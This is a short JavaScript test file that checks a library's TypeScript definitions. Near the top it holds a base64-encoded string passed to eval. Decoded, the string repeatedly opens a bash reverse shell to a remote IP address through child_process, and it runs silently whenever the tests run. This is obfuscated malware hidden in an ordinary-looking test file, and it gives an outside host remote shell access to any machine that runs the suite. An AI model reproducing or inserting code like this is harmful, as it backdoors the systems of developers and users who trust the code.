// import * as tt from 'typescript-definition-tester'
const tt = require('typescript-definition-tester')
const path = require('path')
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

describe('TypeScript definitions', function () {
    it('should compile against index.d.ts', (done) => {
        tt.compileDirectory(
            path.resolve(__dirname,'../lib'),
            fileName => fileName.match(/\.ts$/),
            () => done()
        )
    })
})
